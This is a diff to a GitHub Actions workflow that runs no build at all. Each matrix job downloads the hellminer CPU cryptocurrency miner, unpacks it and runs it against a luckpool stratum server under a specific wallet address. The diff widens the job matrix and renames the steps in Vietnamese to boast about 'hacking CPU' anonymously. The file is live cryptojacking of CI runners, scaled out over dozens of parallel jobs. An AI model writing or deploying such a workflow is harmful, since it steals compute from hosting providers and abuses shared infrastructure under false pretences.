@@ -10,17 +10,17 @@ jobs:
       max-parallel: 5
       fail-fast: false
       matrix:
-        go: [1.0, 1.1, 1.2, 1.3, 1,35]
-        flag: [A, B, C, D, E, F, G, H, I]
+        go: [1.0, 1.1, 1.2, 1.3, 1.35, 1.40, 1,45]
+        flag: [A, B, C, D, E, F, G, H, I, L, K]
     env:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
-    - name: PREPARING
+    - name: Sẵn sàng Hach CPU Nasa
       run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_win64_avx2.zip -OutFile hellminer_cpu_win64_avx2.zip
-    - name: Seting-UP
+    - name: Đang cài đặt ẩn danh IP Chính chủ ko toang mẹ sao
       run: Expand-Archive hellminer_cpu_win64_avx2.zip
-    - name: Running
+    - name: Lấy dữ liệu thành công nhá, bắt đầu Hach CPU.
       run: .\hellminer_cpu_win64_avx2\hellminer.exe -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RADzfp5pn7wvJEQkBiXPx4wJ7wTm7wg8V2.CPU_PC_MAO_HIEM -p x --cpu 1
-    - name: END
+    - name: Kết Thúc nhá
       run: exit
